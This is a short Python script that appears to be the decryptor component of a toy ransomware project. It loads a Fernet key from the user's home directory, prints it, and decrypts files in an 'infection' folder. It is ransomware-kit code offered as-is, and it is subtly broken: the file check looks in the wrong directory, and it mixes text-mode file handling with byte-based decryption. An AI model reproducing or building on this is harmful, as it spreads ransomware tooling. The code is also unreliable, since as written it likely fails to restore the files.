#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
from getpass import getuser

user_name = getuser()
user_dir = '/home/'+user_name
default_user_dir = "/home/"+user_name+"/infection"

def decrypting():
    files = []

    for archive in os.listdir(default_user_dir):
        if os.path.isfile(archive):
            files.append(archive)

    os.chdir(user_dir)

    with open("key.key", "r") as key:
        secret_key = key.read()
    print(secret_key)
    os.chdir(default_user_dir)

    for archive in files:
        with open(archive, "r") as thearchive:
            contents = thearchive.read()
        content_decrypted = Fernet(secret_key).decrypt(contents)
        with open(archive, "w") as thearchive:
            thearchive.write(content_decrypted)
